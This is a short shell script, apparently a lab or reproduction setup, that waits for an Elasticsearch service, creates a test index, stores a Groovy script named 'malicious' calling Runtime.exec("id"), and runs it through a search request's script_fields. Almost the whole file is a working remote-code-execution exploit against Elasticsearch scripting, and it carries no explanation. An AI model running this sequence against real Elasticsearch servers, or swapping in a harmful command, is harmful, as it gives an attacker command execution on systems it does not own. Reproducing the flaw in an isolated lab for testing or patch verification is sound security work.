#!/bin/sh
set -e

# Wait for Elasticsearch to become healthy
until curl -s -f http://elasticsearch:9200/_cluster/health > /dev/null; do
  echo "Waiting for Elasticsearch..."
  sleep 2
done

echo "Elasticsearch is up. Proceeding with initialization."

# Create test index
curl -XPUT 'http://elasticsearch:9200/test' \
     -H 'Content-Type: application/json' \
     -d '{"settings":{"number_of_shards":1,"number_of_replicas":0}}'

# Upload malicious groovy script
curl -XPOST 'http://elasticsearch:9200/_scripts/malicious' \
     -H 'Content-Type: application/json' \
     -d '{"script":{"lang":"groovy","source":"java.lang.Runtime.getRuntime().exec(\"id\");"}}'

# Execute the script via a search request
curl -XPOST 'http://elasticsearch:9200/test/_search' \
     -H 'Content-Type: application/json' \
     -d '{"script_fields":{"cmd":{"script":"malicious"}}}'

exit 0
